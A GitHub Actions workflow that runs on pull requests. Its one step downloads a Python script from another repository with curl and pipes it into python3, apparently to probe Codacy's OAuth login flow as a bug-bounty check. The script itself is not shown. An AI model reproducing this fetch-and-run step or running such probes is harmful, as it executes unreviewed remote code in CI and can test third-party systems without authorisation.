name: Codacy H1 bounded auth checks

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Resolve and inspect Codacy OAuth initiation without following provider redirect
        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/3d9dcc87bab01eddccec7b79d2a96de70d3891b8/.github/scripts/codacy_oauth_probe.py | python3
